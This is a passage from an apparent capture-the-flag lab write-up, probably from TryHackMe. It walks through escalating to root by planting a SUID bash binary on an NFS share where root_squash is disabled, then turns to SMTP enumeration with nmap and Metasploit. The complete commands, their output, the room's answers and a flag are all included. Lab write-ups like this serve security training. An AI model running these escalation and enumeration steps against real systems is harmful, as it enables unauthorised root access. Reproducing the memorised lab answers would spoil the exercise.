</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>Last login: Thu Jun <span style="color:#fab387">4</span> 14:37:50 <span style="color:#fab387">2020</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>cappucino@polonfs:~$</span></span></code></pre></div>
<br>
<h4 id="exploiting-nfs">Exploiting NFS</h4>
<h5 id="what-is-root_squash">What is root_squash?</h5>
<p>By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.</p>
<h5 id="suid">SUID</h5>
<p>So, what are files with the SUID bit set? Essentially, this means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!</p>
<p>Due to compatibility reasons, we will obtain the bash executable directly from the target machine.
With the key obtained in the previous task, we can use SCP with the command <code>scp -i key_name username@10.10.14.168:/bin/bash ~/Downloads/bash</code> to download it onto our attacking machine.</p>
<p>Here&rsquo;s a step by step of the actions we&rsquo;re taking, and how they all tie together to allow us to gain a root shell:</p>
<ol>
<li>NFS Access</li>
<li>Gain Low Privilege Shell</li>
<li>Upload Bash Executable to the NFS share</li>
<li>Set SUID Permissions Through NFS Due To Misconfigured Root Squash</li>
<li>Login Through SSH</li>
<li>Execute SUID Bit Bash Executable</li>
<li>Root Access</li>
</ol>
<p>First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user&rsquo;s home directory.</p>






<pre tabindex="0"><code>root@ip-10-10-233-18:/tmp/mount/cappucino#</code></pre>
<br>
<p>Download the bash executable to your Downloads directory. Then use &ldquo;cp ~/Downloads/bash .&rdquo; to copy the bash executable to the NFS share. The copied bash shell must be owned by a root user, you can set this using &ldquo;sudo chown root bash&rdquo;</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino/.ssh# scp -i id_rsa cappucino@10.10.14.167:/bin/bash ~/Downloads/bash
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>bash 100% 1087KB 85.0MB/s 00:00
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino/.ssh# <span style="color:#89dceb">cd</span> ..
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino# ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino# ls -al
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>total <span style="color:#fab387">36</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>drwxr-xr-x <span style="color:#fab387">5</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Jun <span style="color:#fab387">4</span> <span style="color:#fab387">2020</span> .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>drwxr-xr-x <span style="color:#fab387">3</span> root root <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">21</span> <span style="color:#fab387">2020</span> ..
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>-rw------- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">20</span> Jun <span style="color:#fab387">25</span> 07:00 .bash_history
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">220</span> Apr <span style="color:#fab387">4</span> <span style="color:#fab387">2018</span> .bash_logout
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">3771</span> Apr <span style="color:#fab387">4</span> <span style="color:#fab387">2018</span> .bashrc
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>drwx------ <span style="color:#fab387">2</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .cache
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>drwx------ <span style="color:#fab387">3</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .gnupg
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">807</span> Apr <span style="color:#fab387">4</span> <span style="color:#fab387">2018</span> .profile
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>drwx------ <span style="color:#fab387">2</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .ssh
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">0</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .sudo_as_admin_successful
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino# cp ~/Downloads/bash .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino# ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>bash
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino# sudo chown root bash</span></span></code></pre></div>
<br>
<p>Now, we&rsquo;re going to add the SUID bit permission to the bash executable we just copied to the share using <code>sudo chmod +[permission] bash</code>. What letter do we use to set the SUID bit set using chmod?</p>






<pre tabindex="0"><code>s</code></pre>
<p>The letter <code>s</code> is used to set the setuid (SUID) bit using the <code>chmod</code> command in Linux:</p>
<ul>
<li>chmod u+s &lt;/path/to/the/file&gt;: Sets the setuid bit symbolically</li>
<li>chmod u-s: Removes the setuid bit</li>
</ul>
<br>
<p>Let&rsquo;s do a sanity check, let&rsquo;s check the permissions of the <code>bash</code> executable using <code>ls -la bash</code>. What does the permission set look like? Make sure that it ends with -sr-x.</p>






<pre tabindex="0"><code>-rwsr-sr-x</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino# sudo chmod +s bash
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>root@ip-10-10-233-18:/tmp/mount/cappucino# ls -la bash
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>-rwsr-sr-x <span style="color:#fab387">1</span> root root <span style="color:#fab387">1113504</span> Jun <span style="color:#fab387">25</span> 07:04 bash</span></span></code></pre></div>
<br>
<p>Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Let&rsquo;s run it with &ldquo;./bash -p&rdquo;. The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.</p>
<p>Great! If all&rsquo;s gone well you should have a shell as root! What&rsquo;s the root flag?</p>






<pre tabindex="0"><code>THM{nfs_got_pwned}</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>cappucino@polonfs:~$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>bash
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>cappucino@polonfs:~$ ./bash -p
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>bash-4.4# whoami
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>root</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>bash-4.4# whoami
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>bash-4.4# ls /root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>root.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>bash-4.4# cat /root/root.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>nfs_got_pwned<span style="color:#89dceb;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>bash-4.4#</span></span></code></pre></div>
<br>
<h3 id="smtp-simple-mail-transfer-protocol">SMTP (Simple Mail Transfer Protocol)</h3>
<hr>
<h4 id="understanding-smtp">Understanding SMTP</h4>
<p>The SMTP server performs three basic functions:</p>
<ol>
<li>It verifies who is sending emails through the SMTP server.</li>
<li>It sends the outgoing mail</li>
<li>If the outgoing mail can&rsquo;t be delivered it sends the message back to the sender.</li>
</ol>
<h5 id="pop-and-imap">POP and IMAP</h5>
<p>POP, Post Office Protocol, and IMAP, Internet Message Access Protocol, are both email protocols who are responsible for the transfer of email between a client and a mail server. The main difference is in POP is more simplistic approach of downloading the inbox from the mail server, to the client. Where IMAP will synchronize the current inbox, with the new mail on the server, downloading anything new.</p>
<div style="text-align: center"><img src="./image-25.png"></div>
<br>
<p>What does SMTP stand for?</p>






<pre tabindex="0"><code>Simple Mail Transfer Protocol</code></pre>
<br>
What does SMTP handle the sending of?
```
emails
```
<br>
What is the first step in the SMTP process?






<pre tabindex="0"><code>SMTP handshake</code></pre>
<p>What is the default SMTP port?</p>






<pre tabindex="0"><code>25</code></pre>
<br>
Where does the SMTP server send the email if the recipient's server is not available?






<pre tabindex="0"><code>SMTP Queue</code></pre>
<br>
<p>On what server does the Email ultimately end up on?</p>






<pre tabindex="0"><code>POP/IMAP</code></pre>
<br>
<p>Can a Linux machine run an SMTP server?</p>






<pre tabindex="0"><code>Y</code></pre>
<br>
<p>Can a Windows machine run an SMTP server?</p>






<pre tabindex="0"><code>Y</code></pre>
<br>
<h4 id="enumerating-smtp">Enumerating SMTP</h4>
<p>Poorly configured or vulnerable mail servers can often provide an initial foothold into a network. We want to fingerprint the server to make our targeting as precise as possible before launching an attack. We can use the smtp_version module in Metasploit.</p>
<p>The SMTP service has two internal commands that allow the enumeration of users: VRFY (confirming the names of valid users) and EXPN (which reveals the actual addresses of user&rsquo;s aliases and lists of email). We can do this manually, over a telnet connection – however Metasploit provides a handy module called smtp_enum that will do the legwork for us.</p>
<br>
<p>First, let&rsquo;s run a port scan against the target machine, same as last time. What port is SMTP running on?</p>






<pre tabindex="0"><code>25</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-35-22:~# nmap -sV 10.10.54.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.60 <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-06-26 03:31 BST
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> ip-10-10-54-3.eu-west-1.compute.internal <span style="color:#89dceb;font-weight:bold">(</span>10.10.54.3<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.00069s latency<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Not shown: <span style="color:#fab387">998</span> closed ports
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>25/tcp open smtp Postfix smtpd
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>MAC Address: 02:4B:FA:CD:BD:EB <span style="color:#89dceb;font-weight:bold">(</span>Unknown<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Service Info: Host: polosmtp.home; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 2.53 seconds</span></span></code></pre></div>
<br>
<p>Okay, now we know what port we should be targeting, let&rsquo;s start up Metasploit. What command do we use to do this?</p>






<pre tabindex="0"><code>msfconsole</code></pre>
<br>
<p>Let&rsquo;s search for the module smtp_version, what&rsquo;s its full module name?</p>






<pre tabindex="0"><code>auxiliary/scanner/smtp/smtp_version</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 &gt; search smtp_version
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#6c7086;font-style:italic"># Matching Modules</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#6c7086;font-style:italic"># Name Disclosure Date Rank Check Description</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#fab387">0</span> auxiliary/scanner/smtp/smtp_version normal No SMTP Banner Grabber
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Interact with a module by name or index. For example info 0, use <span style="color:#fab387">0</span> or use auxiliary/scanner/smtp/smtp_version</span></span></code></pre></div>
<br>
<p>Great, now select the module and list the options. How do we do this?</p>






<pre tabindex="0"><code>options</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 &gt; use <span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_version<span style="color:#89dceb;font-weight:bold">)</span> &gt; options
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Module options <span style="color:#89dceb;font-weight:bold">(</span>auxiliary/scanner/smtp/smtp_version<span style="color:#89dceb;font-weight:bold">)</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Name Current Setting Required Description
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>RHOSTS yes The target host<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploi
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>t.html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>RPORT <span style="color:#fab387">25</span> yes The target port <span style="color:#89dceb;font-weight:bold">(</span>TCP<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>THREADS <span style="color:#fab387">1</span> yes The number of concurrent threads <span style="color:#89dceb;font-weight:bold">(</span>max one per host<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>View the full module info with the info, or info -d command.</span></span></code></pre></div>
<br>
<p>Have a look through the options, does everything seem correct? What is the option we need to set?</p>






<pre tabindex="0"><code>RHOSTS</code></pre>
<br>
<p>Set that to the correct value for your target machine. Then run the exploit. What&rsquo;s the system mail name?</p>






<pre tabindex="0"><code>polosmtp.home</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_version<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> rhosts 10.10.54.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#f5e0dc">rhosts</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; 10.10.54.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_version<span style="color:#89dceb;font-weight:bold">)</span> &gt; run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.54.3:25 - 10.10.54.3:25 SMTP <span style="color:#fab387">220</span> polosmtp.home ESMTP Postfix <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu<span style="color:#89dceb;font-weight:bold">)</span><span style="color:#89b4fa">\x</span>0d<span style="color:#89b4fa">\x</span>0a
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.54.3:25 - Scanned <span style="color:#fab387">1</span> of <span style="color:#fab387">1</span> hosts <span style="color:#89dceb;font-weight:bold">(</span>100% <span style="color:#89dceb">complete</span><span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Auxiliary module execution completed</span></span></code></pre></div>
<br>
<p>What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research.</p>






<pre tabindex="0"><code>Postfix</code></pre>
<br>
<p>Good! We&rsquo;ve now got a good amount of information on the target system to move onto the next stage. Let&rsquo;s search for the module <code>smtp_enum</code>, what is the full module name?</p>






<pre tabindex="0"><code>auxiliary/scanner/smtp/smtp_enum</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_version<span style="color:#89dceb;font-weight:bold">)</span> &gt; search smtp_enum
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#6c7086;font-style:italic"># Matching Modules</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
